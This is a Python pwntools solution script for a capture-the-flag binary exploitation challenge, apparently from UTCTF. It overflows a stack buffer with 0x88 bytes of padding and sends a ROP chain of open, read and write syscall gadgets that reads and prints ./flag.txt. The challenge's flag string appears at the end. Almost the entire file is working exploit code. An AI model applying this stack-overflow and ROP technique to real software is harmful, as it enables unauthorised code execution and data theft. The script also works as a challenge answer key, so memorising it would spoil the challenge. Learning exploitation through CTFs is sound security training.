from pwn import *

context.arch = 'amd64'
context.log_level = 'debug'
context.terminal = ['tmux', 'splitw', '-h']

p = gdb.debug('./chal', '''
    b *0x41ae16
    continue
''')

# p = remote('challenge.utctf.live', 5141)

# Syscall numbers
SYS_READ = 0
SYS_WRITE = 1
SYS_OPEN = 2
SYS_EXIT = 60

# Gadgets for setting up syscalls
# ROPgadget --binary chal --only "pop|ret" | grep -E "pop rax|pop rdi|pop rsi|pop rdx" | head -10
POP_RAX = 0x450507       # pop rax; ret
POP_RDI = 0x40204f       # pop rdi; ret
POP_RSI = 0x40a0be       # pop rsi; ret
POP_RDX_RBX = 0x48630b   # pop rdx; pop rbx; ret
# objdump -d chal | grep -A1 "syscall" | grep "ret"
SYSCALL_RET = 0x41ae16   # syscall; ret

# BSS section for storing our filename and read buffer
# readelf -S chal | grep .bss
BSS = 0x4c82a0
FILENAME_ADDR = BSS
BUFFER_ADDR = BSS + 16  # More space for filename

# ROP chain
chain = [
    # 1. Read filename from stdin
    POP_RAX, SYS_READ,         # rax = 0 (read syscall)
    POP_RDI, 0,                # rdi = 0 (stdin)
    POP_RSI, FILENAME_ADDR,    # rsi = address to store filename
    POP_RDX_RBX, 16, 0,        # rdx = 16 (read up to 16 bytes for filename)
    SYSCALL_RET,               # syscall; ret
    
    # 2. Open the file
    POP_RAX, SYS_OPEN,         # rax = 2 (open syscall)
    POP_RDI, FILENAME_ADDR,    # rdi = pointer to filename
    POP_RSI, 0,                # rsi = 0 (O_RDONLY)
    POP_RDX_RBX, 0, 0,         # rdx = 0 (mode, not used for O_RDONLY)
    SYSCALL_RET,               # syscall; ret
    
    # 3. Read the flag
    # After open, the file descriptor is typically more than3 (stdin=0, stdout=1, stderr=2)
    POP_RDI, 5,                # rdi = 5 (file descriptor)
    POP_RAX, SYS_READ,         # rax = 0 (read syscall)
    POP_RSI, BUFFER_ADDR,      # rsi = buffer address
    POP_RDX_RBX, 100, 0,       # rdx = 100 (count)
    SYSCALL_RET,               # syscall; ret
    
    # 4. Write the flag to stdout
    POP_RAX, SYS_WRITE,        # rax = 1 (write syscall)
    POP_RDI, 1,                # rdi = 1 (stdout)
    POP_RSI, BUFFER_ADDR,      # rsi = buffer address
    POP_RDX_RBX, 100, 0,       # rdx = 100 (count)
    SYSCALL_RET,               # syscall; ret
    
    # 5. Exit cleanly
    POP_RAX, SYS_EXIT,         # rax = 60 (exit syscall)
    POP_RDI, 0,                # rdi = 0 (status)
    SYSCALL_RET                # syscall; ret
]

# Create the payload
payload = b'\x00' * 0x88  # Padding to reach the return address

# Add the ROP chain
for gadget in chain:
    payload += p64(gadget) if isinstance(gadget, int) else gadget

# Send the payload
p.recvuntil(b'Input> ')
p.send(payload)

# After our payload is sent, we need to send the filename
p.recvuntil(b'Flag: ')
p.send(b'./flag.txt\x00')

p.interactive()

# utflag{r0p_with_4_littl3_catch}